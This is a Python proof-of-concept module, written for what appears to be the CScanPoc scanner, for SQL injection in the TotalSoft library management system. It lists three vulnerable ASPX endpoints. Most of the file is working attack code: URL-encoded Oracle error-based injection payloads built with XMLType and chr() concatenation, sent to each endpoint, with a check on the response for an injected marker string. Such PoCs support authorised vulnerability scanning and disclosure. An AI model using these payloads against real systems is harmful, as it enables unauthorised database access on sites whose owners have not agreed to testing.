# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'TotalSoft_0001' # 平台漏洞编号，留空
    name = '图腾软件图书管理系统 SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2016-05-14'  # 漏洞公布时间
    desc = '''
        图腾软件图书管理系统三处SQL注入漏洞：
        /Code.aspx?id=0143034244
        /Periodical.aspx?ID=1113000371
        /SearchJournalByChar.aspx?QU=0
    ''' # 漏洞描述
    ref = 'http://www.seebug.org/vuldb/ssvid-91556' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'totalsoft'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ef5adf17-09b0-4180-ae5e-d1f5bee1c7c3'
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            urls = [
                arg + '/Code.aspx?id=0143034244%27%20and%20233=(select%20upper(XMLType(chr(60)||chr(58)||CHR(87)||CHR(84)||CHR(70)||CHR(65)||CHR(66)||CHR(67)))%20from%20dual)%20and%20%27wtf%27=%27wtf',
                arg + '/Periodical.aspx?ID=1113000371%27%20and%20233=(select%20upper(XMLType(chr(60)||chr(58)||CHR(87)||CHR(84)||CHR(70)||CHR(65)||CHR(66)||CHR(67)))%20from%20dual)%20and%20%27wtf%27=%27wtf',
                arg + '/SearchJournalByChar.aspx?QU=0%27%20and%20233=(select%20upper(XMLType(chr(60)||chr(58)||CHR(87)||CHR(84)||CHR(70)||CHR(65)||CHR(66)||CHR(67)))%20from%20dual)%20and%20%27wtf%27=%27wtf',
                ]
            for url in urls:
                code, head, res, err, _ = hh.http(url)
                if (code != 0) and ('WTFABC' in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()